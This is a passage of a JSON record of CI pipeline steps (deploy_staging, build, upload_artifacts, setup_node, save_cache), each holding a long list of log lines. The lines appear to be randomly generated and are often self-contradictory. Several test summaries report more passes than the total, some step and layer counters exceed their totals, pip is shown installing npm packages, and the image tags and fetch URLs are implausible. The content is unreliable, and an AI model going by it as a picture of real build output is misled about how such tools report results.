          "Cache miss for key-3965",
          "Minifying app.js",
          "npm notice: package.json updated",
          "npm install: added 139 packages",
          "Using Node.js 16.18.8",
          "Step 11/24: Deploying",
          "Building Docker image...",
          "Minifying main.js",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "POST /upload - 201 (21ms)",
          "Platform: linux-x64",
          "NODE_ENV=production",
          "Test Suites: 28 passed, 41 total",
          "npm install: resolved 851 packages",
          "pip: Collecting lodash",
          "Compiling utils/handler.rs...",
          "Verifying...",
          "[12:47:48] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (92MB)",
          "Ready.",
          "Ran 55 tests in 29s",
          "Processing...",
          "Done.",
          "Step 2/25: Building",
          "  PASS: integration/test_api_health.spec.js",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (72ms)",
          "[12:47:48] INFO: Request completed",
          "Ran 104 tests in 44s",
          "[12:47:48] INFO: Cache refreshed",
          "[12:47:48] INFO: Request completed",
          "[12:47:48] INFO: Processing request",
          "[12:47:48] INFO: Processing request",
          "[12:47:48] INFO: Cache refreshed",
          "Pulling image: python:latest",
          "\u2717 build failed with exit code 54",
          "[12:47:48] INFO: Request completed",
          "npm notice: created a lockfile",
          "\u2713 build completed",
          "[12:47:48] DEBUG: Initializing service",
          "Platform: darwin-arm64",
          "Compiling utils/utils.go...",
          "Connection established",
          "[12:47:48] INFO: Request completed",
          "Compiling utils/index.js...",
          "Exception: RuntimeError",
          "[12:47:48] INFO: Connecting to database",
          "Test Suites: 45 passed, 39 total",
          "Step 6/18: Deploying",
          "Already up to date.",
          "npm notice: created a lockfile",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:48] DEBUG: Initializing service",
          "Pushing to registry...",
          "Test Suites: 50 passed, 6 total",
          "Completed.",
          "Artifact downloaded: 37MB",
          "NODE_ENV=test",
          "Step 4/20: Building",
          "Platform: linux-x64",
          "Pulling image: python:latest",
          "Switched to branch 'feature/task-362'",
          "Step 17/20: Running migrations",
          "[12:47:48] DEBUG: Query executed in 21ms",
          "Completed.",
          "Building Docker image...",
          "Step 14/17: Running migrations",
          "[12:47:48] DEBUG: Query executed in 57ms",
          "\u2717 build failed with exit code 99",
          "pip: Collecting prettier",
          "OK",
          "Minifying app.js",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-11T12:49:20.616607",
        "finished_at": "2025-12-11T12:50:18.270085",
        "log_lines": [
          "=== Step: build ===",
          "Time: 97.39s",
          "[12:47:48] INFO: Request completed",
          "Minifying vendor.js",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache restored successfully (499MB)",
          "\u2713 validate completed",
          "[12:47:48] INFO: Cache refreshed",
          "Completed.",
          "  PASS: unit/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Checking out develop branch",
          "Compiling lib/main.py...",
          "Installing express@5.18.3",
          "Time: 40.102s",
          "Verifying...",
          "Uploading artifact 'dist' (45 files)",
          "Finished.",
          "\u2713 Step 'install' succeeded",
          "npm install: resolved 1647 packages",
          "Step 4/19: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:48] INFO: Request completed",
          "Finished.",
          "Creating production build...",
          "Ready.",
          "[12:47:48] INFO: Processing request",
          "OK",
          "pip install: Successfully installed prettier-2.0",
          "Ready.",
          "HEAD is now at c4b4952",
          "[12:47:48] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Layer 4/9: RUN command",
          "Done.",
          "Done.",
          "Compiling components/main.py...",
          "Time: 35.772s",
          "NODE_ENV=test",
          "pip install: Successfully installed webpack-2.20",
          "Ran 149 tests in 39s",
          "Step 15/24: Linting",
          "Cache invalidated: dependencies",
          "Compiling components/app.ts...",
          "Ran 50 tests in 37s",
          "Step 12/22: Running migrations",
          "Tests: 419 passed, 320 total",
          "Cache invalidated: build",
          "Step 6/21: Building",
          "Cache restored successfully (129MB)",
          "Success!",
          "Coverage: 90% statements, 76% branches",
          "WARNING: eslint has known vulnerabilities",
          "Minifying vendor.js",
          "[12:47:48] INFO: Cache refreshed",
          "Verifying...",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/utils.go...",
          "Uploading artifact 'dist' (46 files)",
          "Transforming 842 files...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "TLS handshake completed",
          "Transforming 145 files...",
          "pip install: Successfully installed react-5.2",
          "Switched to branch 'feature/task-707'",
          "Platform: linux-x64",
          "Snapshots: 0 passed, 3 total",
          "Compiling utils/service.java...",
          "Ready.",
          "[12:47:48] DEBUG: Memory usage: 1308MB",
          "Layer 9/8: ENV command",
          "Finished.",
          "Compiling utils/index.js...",
          "Fetching submodules...",
          "[12:47:48] DEBUG: Loading configuration",
          "Loading...",
          "[12:47:48] INFO: Processing request",
          "pip: Downloading express-5.17.tar.gz",
          "Layer 9/12: RUN command",
          "OK",
          "npm notice: created a lockfile",
          "pip install: Successfully installed axios-5.1",
          "Transforming 388 files...",
          "Layer 5/12: RUN command",
          "pip: Downloading jest-4.18.tar.gz",
          "Creating production build...",
          "Environment: test",
          "Transforming 647 files...",
          "Step 14/20: Running migrations",
          "Loading...",
          "Using Python 3.10",
          "Uploading artifact 'dist' (23 files)",
          "Step 14/18: Deploying",
          "Compiling components/service.java...",
          "POST /data - 200 (492ms)",
          "[12:47:48] WARN: Deprecated API usage",
          "Done.",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "WARNING: express has known vulnerabilities",
          "Already up to date.",
          "\u2713 Task completed in 3648ms",
          "Layer 8/12: RUN command",
          "Already up to date.",
          "Done.",
          "  PASS: unit/test_api_health.spec.js",
          "npm notice: created a lockfile",
          "Ran 127 tests in 1s",
          "[12:47:48] DEBUG: Query executed in 1ms",
          "Transforming 109 files...",
          "Artifact uploaded: dist.zip (56MB)",
          "Test Suites: 21 passed, 23 total",
          "[12:47:48] INFO: Cache refreshed",
          "FAILED: test_api_health",
          "Cache restored successfully (499MB)",
          "Ran 108 tests in 56s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling utils/handler.rs...",
          "[12:47:48] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:48] INFO: Request completed",
          "\u2713 Step 'install' succeeded",
          "Switched to branch 'feature/task-783'",
          "Cache miss for key-4911",
          "Test Suites: 49 passed, 36 total",
          "TLS handshake completed",
          "Uploading artifact 'build' (37 files)",
          "Generating source maps...",
          "Cache invalidated: build",
          "Fetching from https://googleapis.com/package.json",
          "Using Node.js 17.13.8",
          "Layer 2/12: RUN command",
          "Generating source maps...",
          "Ready.",
          "Transforming 619 files...",
          "Creating production build...",
          "FAILED: test_auth_login",
          "Finished.",
          "Step 11/16: Running migrations",
          "Using Node.js 15.7.1",
          "Optimizing 75 modules...",
          "NODE_ENV=production",
          "Step 4/19: Installing dependencies",
          "GET /health - 204 (44ms)",
          "Compiling src/index.js...",
          "npm notice: created a lockfile",
          "Snapshots: 12 passed, 10 total",
          "\u2713 All checks passed",
          "\u2713 validate completed",
          "Platform: darwin-arm64",
          "Uploading artifact 'coverage' (25 files)",
          "Connection established",
          "Waiting...",
          "Cache miss for key-1083",
          "[12:47:48] DEBUG: Query executed in 89ms",
          "Ready.",
          "Uploading artifact 'coverage' (48 files)",
          "Step 13/17: Testing",
          "Already up to date.",
          "\u2717 build failed with exit code 34",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "[12:47:48] DEBUG: Memory usage: 143MB",
          "Environment: development",
          "Building Docker image...",
          "Compiling src/main.py...",
          "Cache hit for key-4901",
          "Using Node.js 18.9.0",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (18MB)",
          "Snapshots: 14 passed, 36 total",
          "Optimizing 88 modules...",
          "pip: Collecting jest",
          "pip install: Successfully installed prettier-4.18",
          "Uploading artifact 'dist' (8 files)",
          "Coverage: 89% statements, 87% branches",
          "Step 15/16: Installing dependencies",
          "[12:47:48] INFO: Starting build process",
          "Loading...",
          "[12:47:48] INFO: Starting build process",
          "[12:47:48] INFO: Request completed",
          "Step 5/17: Linting",
          "[12:47:48] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/20: Testing",
          "Using Python 3.10",
          "OK",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Checking out master branch",
          "Layer 8/11: RUN command",
          "Artifact downloaded: 18MB",
          "pip: Downloading axios-5.13.tar.gz",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "Uploading artifact 'build' (46 files)",
          "Coverage: 90% statements, 65% branches",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Waiting...",
          "[12:47:48] INFO: Processing request",
          "Connection established",
          "Snapshots: 4 passed, 5 total",
          "\u2717 build failed with exit code 108",
          "Done.",
          "Ready.",
          "Exception: TypeError",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Layer 1/10: RUN command",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Compiling lib/utils.go...",
          "Creating production build...",
          "GET /health - 200 (36ms)",
          "Exception: NullPointerException",
          "[12:47:48] INFO: Cache refreshed",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] DEBUG: Memory usage: 1105MB",
          "Installing webpack@4.3.7",
          "Cache miss for key-4142",
          "pip: Downloading jest-2.4.tar.gz",
          "npm notice: created a lockfile",
          "Success!",
          "[12:47:48] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:47:48] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Compiling utils/utils.go...",
          "WARNING: axios has known vulnerabilities",
          "Step 12/23: Deploying",
          "Using Python 3.9",
          "Success!",
          "[12:47:48] INFO: Cache refreshed",
          "Cache hit for key-8543",
          "Time: 79.306s",
          "Creating production build...",
          "Step 9/18: Building",
          "POST /upload - 202 (462ms)",
          "Success!",
          "Fetching submodules...",
          "Exception: ValueError",
          "Snapshots: 33 passed, 27 total",
          "pip: Collecting eslint",
          "Switched to branch 'feature/task-278'",
          "Image pulled successfully",
          "Optimizing 37 modules...",
          "npm install: resolved 1303 packages",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Snapshots: 48 passed, 49 total",
          "Ran 108 tests in 33s",
          "Step 20/25: Testing",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Fetching from https://gcr.io/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "GET /status - 200 (36ms)",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:48] INFO: Processing request",
          "Generating source maps...",
          "Processing...",
          "[12:47:48] WARN: Deprecated API usage",
          "HEAD is now at 8bda8a9",
          "[12:47:48] DEBUG: Query executed in 75ms",
          "Ran 175 tests in 46s",
          "Step 15/25: Deploying",
          "[12:47:48] DEBUG: Loading configuration",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-11T12:50:18.270085",
        "finished_at": "2025-12-11T12:50:37.487911",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Generating source maps...",
          "Ran 158 tests in 31s",
          "Coverage: 89% statements, 76% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:48] DEBUG: Query executed in 30ms",
          "Optimizing 79 modules...",
          "Already up to date.",
          "Pushing to registry...",
          "Step 1/15: Running migrations",
          "Using Python 3.11",
          "Step 7/15: Building",
          "Step 13/20: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 75 modules...",
          "Loading...",
          "Switched to branch 'hotfix/task-491'",
          "Cache miss for key-9182",
          "Test Suites: 43 passed, 15 total",
          "pip install: Successfully installed webpack-1.20",
          "[12:47:48] DEBUG: Memory usage: 706MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] ERROR: Connection failed",
          "Bundling styles.js",
          "[12:47:48] WARN: Deprecated API usage",
          "Fetching from https://github.com/package.json",
          "\u2713 Task completed in 132ms",
          "Cache saved successfully",
          "Uploading artifact 'coverage' (27 files)",
          "NODE_ENV=test",
          "OK",
          "[12:47:48] DEBUG: Connection pool: 9 active",
          "Processing...",
          "Step 10/22: Linting",
          "Step 15/24: Installing dependencies",
          "Waiting...",
          "[12:47:48] DEBUG: Query executed in 37ms",
          "Compiling lib/service.java...",
          "  PASS: e2e/test_auth_login.spec.js",
          "npm install: resolved 606 packages",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_api_health",
          "TLS handshake completed",
          "Step 19/17: Testing",
          "  PASS: test_auth_login (397ms)",
          "Ready.",
          "[12:47:48] WARN: Deprecated API usage",
          "Ready.",
          "HEAD is now at 7a4fb16",
          "Step 16/22: Building",
          "Compiling utils/app.ts...",
          "[12:47:48] DEBUG: Connection pool: 10 active",
          "[12:47:48] DEBUG: Memory usage: 1568MB",
          "\u2713 Task completed in 3179ms",
          "Building Docker image...",
          "Image pulled successfully",
          "\u2713 Task completed in 4678ms",
          "Pulling image: alpine:18",
          "npm notice: package.json updated",
          "[12:47:48] WARN: Deprecated API usage",
          "TLS handshake completed",
          "TLS handshake completed",
          "Test Suites: 24 passed, 17 total",
          "Fetching from https://githubusercontent.com/package.json",
          "Switched to branch 'hotfix/task-583'",
          "Fetching from https://npmjs.org/package.json",
          "yarn add: Done in 9.89s",
          "Success!",
          "yarn add: Done in 25.66s",
          "npm install: resolved 560 packages",
          "TLS handshake completed",
          "Image pulled successfully",
          "Cache miss for key-3902",
          "\u2713 Task completed in 4285ms",
          "OK",
          "Connection established",
          "Pushing to registry...",
          "Using Python 3.12",
          "Step 19/23: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "yarn add: Done in 27.87s",
          "Minifying app.js",
          "Tests: 215 passed, 354 total",
          "Transforming 815 files...",
          "Transforming 830 files...",
          "Step 18/16: Installing dependencies",
          "Processing...",
          "Compiling lib/service.java...",
          "Verifying...",
          "Ready.",
          "Step 15/15: Building",
          "Bundling main.js",
          "Cache invalidated: node_modules",
          "Compiling components/utils.go...",
          "[12:47:48] INFO: Request completed",
          "TLS handshake completed",
          "Uploading artifact 'build' (45 files)",
          "Exception: TypeError",
          "WARNING: eslint has known vulnerabilities",
          "Step 16/24: Installing dependencies",
          "Compiling lib/main.py...",
          "NODE_ENV=development",
          "Cache hit for key-1947",
          "[12:47:48] INFO: Connecting to database",
          "Done.",
          "[12:47:48] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "\u2713 package completed",
          "Step 9/19: Building",
          "TLS handshake completed",
          "Pulling image: alpine:3.11",
          "Loading...",
          "Using Python 3.10",
          "POST /upload - 201 (115ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "FAILED: test_user_create",
          "Building Docker image...",
          "Step 20/23: Deploying",
          "[12:47:48] INFO: Processing request",
          "pip: Installing build dependencies...",
          "yarn add: Done in 6.60s",
          "Finished.",
          "Step 4/20: Installing dependencies",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Connection established",
          "Step 18/24: Linting",
          "Pulling image: node:latest",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: dist.zip (40MB)",
          "Layer 7/8: RUN command",
          "[12:47:48] INFO: Processing request",
          "[12:47:48] INFO: Connecting to database",
          "Ran 143 tests in 50s",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 41 passed, 4 total",
          "FAILED: test_user_create",
          "Completed.",
          "Cache restored successfully (49MB)",
          "FAILED: test_cache_hit",
          "Loading...",
          "Snapshots: 29 passed, 13 total",
          "[12:47:48] DEBUG: Query executed in 68ms",
          "WARNING: webpack has known vulnerabilities",
          "Loading...",
          "Optimizing 65 modules...",
          "Step 15/21: Running migrations",
          "Artifact downloaded: 34MB",
          "[12:47:48] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "  PASS: test_cache_hit (46ms)",
          "Optimizing 57 modules...",
          "Creating production build...",
          "[12:47:48] DEBUG: Loading configuration",
          "Ran 172 tests in 56s",
          "Loading...",
          "NODE_ENV=production",
          "Checking out master branch",
          "\u2717 build failed with exit code 96",
          "yarn add: Done in 13.63s",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Pulling image: python:18",
          "\u2713 validate completed",
          "[12:47:48] DEBUG: Connection pool: 13 active",
          "[12:47:48] INFO: Cache refreshed",
          "Cache restored successfully (366MB)",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Coverage: 85% statements, 97% branches",
          "Waiting...",
          "Step 4/20: Linting",
          "Finished.",
          "Step 5/25: Building",
          "Connection established",
          "Using Python 3.10",
          "[12:47:48] INFO: Request completed",
          "[12:47:48] DEBUG: Initializing service",
          "Processing...",
          "Step 16/16: Installing dependencies",
          "Switched to branch 'hotfix/task-737'",
          "Optimizing 52 modules...",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "[12:47:48] DEBUG: Memory usage: 887MB",
          "[12:47:48] INFO: Starting build process",
          "pip: Downloading eslint-1.8.tar.gz",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "  PASS: e2e/test_api_health.spec.js",
          "Done.",
          "npm notice: package.json updated",
          "[12:47:48] DEBUG: Connection pool: 9 active",
          "[12:47:48] DEBUG: Loading configuration",
          "TLS handshake completed",
          "POST /api - 200 (306ms)",
          "Cache restored successfully (242MB)",
          "Compiling src/service.java...",
          "NODE_ENV=test",
          "Optimizing 53 modules...",
          "Finished.",
          "Artifact uploaded: dist.zip (16MB)",
          "Cache miss for key-5857",
          "HEAD is now at 8f4fbf3",
          "pip install: Successfully installed axios-1.2",
          "Connection established",
          "Artifact uploaded: dist.zip (89MB)",
          "Environment: development",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Coverage: 85% statements, 95% branches",
          "Verifying...",
          "Tests: 139 passed, 330 total",
          "OK",
          "Coverage: 97% statements, 83% branches",
          "Pulling image: python:latest",
          "Checking out develop branch",
          "[12:47:48] DEBUG: Memory usage: 1758MB",
          "Checking out master branch",
          "Processing...",
          "Transforming 218 files...",
          "Generating source maps...",
          "Environment: staging",
          "Done.",
          "Done.",
          "Verifying...",
          "OK",
          "OK",
          "Already up to date.",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 5/15: Testing",
          "Ran 121 tests in 37s",
          "Done.",
          "[12:47:48] DEBUG: Loading configuration",
          "Generating source maps...",
          "Cache restored successfully (208MB)",
          "[12:47:48] INFO: Request completed",
          "npm notice: package.json updated",
          "npm install: resolved 1770 packages",
          "Pulling image: python:18",
          "[12:47:48] INFO: Processing request",
          "Step 13/24: Building",
          "Compiling utils/service.java...",
          "GET /api - 201 (4ms)",
          "Step 13/23: Linting",
          "npm notice: package.json updated",
          "Creating production build...",
          "Compiling lib/service.java...",
          "Creating production build...",
          "WARNING: lodash has known vulnerabilities",
          "POST /data - 200 (276ms)",
          "npm notice: created a lockfile",
          "Cache miss for key-9728",
          "Ready.",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 20/15: Building",
          "Processing...",
          "Artifact downloaded: 9MB",
          "npm install: added 118 packages",
          "Environment: production",
          "Cache hit for key-7928",
          "[12:47:48] DEBUG: Connection pool: 19 active",
          "Test Suites: 27 passed, 35 total",
          "POST /data - 200 (331ms)",
          "Step 15/19: Deploying",
          "Minifying main.js",
          "Minifying app.js",
          "Step 9/16: Building",
          "Step 6/25: Testing",
          "OK",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-11T12:50:37.487911",
        "finished_at": "2025-12-11T12:50:56.705737",
        "log_lines": [
          "=== Step: setup_node ===",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] INFO: Starting build process",
          "Artifact uploaded: dist.zip (27MB)",
          "Step 2/23: Running migrations",
          "  PASS: test_api_health (282ms)",
          "Loading...",
          "[12:47:48] INFO: Request completed",
          "OK",
          "Fetching submodules...",
          "Environment: development",
          "Compiling utils/service.java...",
          "Done.",
          "Step 18/21: Deploying",
          "Ready.",
          "OK",
          "Switched to branch 'bugfix/task-528'",
          "NODE_ENV=production",
          "  PASS: test_user_create (58ms)",
          "Cache miss for key-4741",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Layer 5/13: ENV command",
          "Step 13/22: Testing",
          "Uploading artifact 'dist' (16 files)",
          "Already up to date.",
          "[12:47:48] INFO: Cache refreshed",
          "pip: Collecting lodash",
          "Success!",
          "HEAD is now at 1531645",
          "[12:47:48] INFO: Cache refreshed",
          "[12:47:48] WARN: Deprecated API usage",
          "Already up to date.",
          "npm notice: package.json updated",
          "Compiling utils/service.java...",
          "Transforming 477 files...",
          "WARNING: react has known vulnerabilities",
          "[12:47:48] DEBUG: Query executed in 66ms",
          "Uploading artifact 'build' (37 files)",
          "[12:47:48] DEBUG: Loading configuration",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "[12:47:48] INFO: Connecting to database",
          "Processing...",
          "Checking out develop branch",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] DEBUG: Memory usage: 822MB",
          "[12:47:48] DEBUG: Query executed in 63ms",
          "Compiling components/index.js...",
          "Transforming 493 files...",
          "Compiling lib/utils.go...",
          "Compiling utils/index.js...",
          "[12:47:48] DEBUG: Loading configuration",
          "TLS handshake completed",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (95MB)",
          "[12:47:48] WARN: Deprecated API usage",
          "Cache hit for key-5499",
          "Cache invalidated: build",
          "Step 16/23: Linting",
          "\u2713 Task completed in 1473ms",
          "\u2713 All checks passed",
          "Ran 163 tests in 17s",
          "HEAD is now at 85c8390",
          "Ready.",
          "Step 14/25: Testing",
          "Bundling vendor.js",
          "Loading...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Transforming 411 files...",
          "Coverage: 72% statements, 86% branches",
          "[12:47:48] WARN: Deprecated API usage",
          "\u2713 Task completed in 1799ms",
          "\u2713 All checks passed",
          "Creating production build...",
          "Already up to date.",
          "Cache restored successfully (29MB)",
          "Optimizing 86 modules...",
          "Pushing to registry...",
          "Processing...",
          "GET /health - 204 (70ms)",
          "Bundling vendor.js",
          "[12:47:48] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "[12:47:48] ERROR: Connection failed",
          "npm notice: package.json updated",
          "[12:47:48] DEBUG: Query executed in 18ms",
          "WARNING: jest has known vulnerabilities",
          "Minifying vendor.js",
          "Test Suites: 29 passed, 30 total",
          "Switched to branch 'hotfix/task-206'",
          "Step 19/21: Linting",
          "\u2713 All checks passed",
          "[12:47:48] INFO: Connecting to database",
          "Using Node.js 17.0.3",
          "[12:47:48] INFO: Request completed",
          "\u2713 Task completed in 4666ms",
          "Layer 9/14: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Artifact uploaded: dist.zip (83MB)",
          "Step 7/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 21 tests in 32s",
          "pip: Downloading lodash-4.15.tar.gz",
          "Finished.",
          "Uploading artifact 'coverage' (20 files)",
          "WARNING: eslint has known vulnerabilities",
          "Step 11/18: Running migrations",
          "\u2713 package completed",
          "Cache restored successfully (24MB)",
          "Pushing to registry...",
          "\u2713 Step 'install' succeeded",
          "[12:47:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 96% statements, 71% branches",
          "NODE_ENV=production",
          "Cache miss for key-5240",
          "Step 1/25: Testing",
          "Artifact downloaded: 16MB",
          "Generating source maps...",
          "NODE_ENV=production",
          "Connection established",
          "Test Suites: 20 passed, 9 total",
          "Step 4/15: Testing",
          "Layer 8/8: RUN command",
          "Completed.",
          "Platform: darwin-arm64",
          "  PASS: test_user_create (39ms)",
          "Waiting...",
          "pip: Installing build dependencies...",
          "FAILED: test_auth_login",
          "NODE_ENV=development",
          "\u2713 Step 'test' succeeded",
          "Step 3/17: Building",
          "\u2713 validate completed",
          "Connection established",
          "Checking out develop branch",
          "Coverage: 85% statements, 97% branches",
          "TLS handshake completed",
          "npm install: added 240 packages",
          "Uploading artifact 'coverage' (12 files)",
          "OK",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "Step 10/22: Testing",
          "TLS handshake completed",
          "[12:47:48] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Transforming 259 files...",
          "Optimizing 50 modules...",
          "Test Suites: 37 passed, 46 total",
          "Uploading artifact 'build' (24 files)",
          "[12:47:48] INFO: Processing request",
          "Artifact uploaded: dist.zip (19MB)",
          "\u2713 Task completed in 3405ms",
          "Compiling components/handler.rs...",
          "Step 19/16: Running migrations",
          "Image pulled successfully",
          "[12:47:48] INFO: Starting build process",
          "  PASS: test_user_create (7ms)",
          "npm notice: created a lockfile",
          "Step 1/21: Building",
          "Fetching submodules...",
          "Step 1/19: Running migrations",
          "Time: 87.238s",
          "npm notice: created a lockfile",
          "Verifying...",
          "Ready.",
          "Compiling utils/service.java...",
          "Switched to branch 'bugfix/task-939'",
          "npm notice: package.json updated",
          "[12:47:48] DEBUG: Connection pool: 6 active",
          "Waiting...",
          "[12:47:48] DEBUG: Query executed in 44ms",
          "Pulling image: node:3.11",
          "Compiling src/service.java...",
          "[12:47:48] DEBUG: Initializing service",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/service.java...",
          "Already up to date.",
          "Step 19/24: Testing",
          "Compiling lib/utils.go...",
          "npm notice: package.json updated",
          "Bundling runtime.js",
          "[12:47:48] DEBUG: Query executed in 23ms",
          "[12:47:48] DEBUG: Loading configuration",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "Minifying vendor.js",
          "  PASS: test_cache_hit (462ms)",
          "WARNING: react has known vulnerabilities",
          "\u2713 package completed",
          "Creating production build...",
          "[12:47:48] DEBUG: Connection pool: 3 active",
          "Compiling components/index.js...",
          "Creating production build...",
          "Using Node.js 18.9.4",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: production",
          "[12:47:48] DEBUG: Initializing service",
          "Step 14/23: Running migrations",
          "FAILED: test_db_connect",
          "Using Python 3.10",
          "Environment: production",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: test",
          "Fetching submodules...",
          "  PASS: test_api_health (404ms)",
          "Layer 9/8: COPY command",
          "[12:47:48] DEBUG: Initializing service",
          "Verifying...",
          "Ready.",
          "Checking out develop branch",
          "Minifying vendor.js",
          "[12:47:48] INFO: Cache refreshed",
          "  PASS: integration/test_api_health.spec.js",
          "Tests: 70 passed, 138 total",
          "NODE_ENV=development",
          "Time: 38.417s",
          "Artifact uploaded: build.tar.gz (30MB)",
          "WARNING: react has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Exception: NullPointerException",
          "[12:47:48] DEBUG: Query executed in 7ms",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/service.java...",
          "pip install: Successfully installed jest-5.19",
          "Creating production build...",
          "Tests: 145 passed, 131 total",
          "Using Python 3.11",
          "Step 14/17: Installing dependencies",
          "Artifact downloaded: 42MB",
          "GET /health - 201 (77ms)",
          "POST /api - 200 (41ms)",
          "Step 13/25: Building",
          "Test Suites: 38 passed, 8 total",
          "Fetching from https://githubusercontent.com/package.json",
          "WARNING: webpack has known vulnerabilities",
          "Checking out master branch",
          "[12:47:48] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Waiting...",
          "[12:47:48] DEBUG: Memory usage: 391MB",
          "Compiling utils/index.js...",
          "HEAD is now at 256859d",
          "Bundling vendor.css",
          "Compiling src/utils.go...",
          "Step 19/23: Linting",
          "OK",
          "Layer 5/13: COPY command",
          "[12:47:48] DEBUG: Connection pool: 18 active",
          "Cache miss for key-4554",
          "FAILED: test_cache_hit",
          "pip install: Successfully installed jest-2.10",
          "POST /api - 202 (406ms)",
          "Image pulled successfully",
          "Test Suites: 11 passed, 31 total",
          "NODE_ENV=production",
          "pip: Collecting jest",
          "Artifact downloaded: 33MB",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-11T12:50:56.705737",
        "finished_at": "2025-12-11T12:51:08.236433",
        "log_lines": [
          "=== Step: save_cache ===",
          "Snapshots: 6 passed, 21 total",
          "Step 15/18: Building",
          "[12:47:48] INFO: Connecting to database",
          "TLS handshake completed",
          "Bundling main.css",
          "Fetching from https://registry.npmjs.org/package.json",
          "\u2713 deploy completed",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'build' (23 files)",
          "Done.",
          "Cache saved successfully",
          "Building Docker image...",
          "Installing jest@5.20.9",
          "Transforming 892 files...",
          "Layer 1/14: COPY command",
          "[12:47:48] WARN: Deprecated API usage",
          "Creating production build...",
          "Processing...",
          "Cache invalidated: build",
          "Pulling image: alpine:3.11",
          "[12:47:48] INFO: Connecting to database",
          "Compiling src/main.py...",
